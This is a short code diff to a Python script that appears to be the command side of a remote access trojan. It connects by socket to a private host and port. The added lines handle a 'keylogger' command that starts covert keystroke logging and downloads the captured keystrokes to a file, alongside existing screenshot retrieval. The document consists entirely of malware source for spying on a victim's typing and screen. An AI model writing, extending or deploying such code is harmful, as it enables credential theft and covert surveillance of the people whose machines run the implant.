@@ -7,6 +7,7 @@ import base64
 
 HOST = "10.0.2.7"
 PORT = 6666
+log_started = False
 
 
 def receive_data():
@@ -82,6 +83,14 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     data = write_file("screenshot.png", data)
                     print("[+] Default location used. Please use screenshot (path) unless you want your "
                           "screenshot overwritten")
+
+            if command[0] == "keylogger":
+                if command[1] == "download" and log_started and "Error" not in data:
+                    data = write_file("keylogdata.txt", data)
+                    print("Keylog file downloaded.")
+                if command[1] == "start":
+                    if data == "[+] Keylogger started (manual logging)":
+                        log_started = True
         except Exception:
             data = "[+] Error"
 
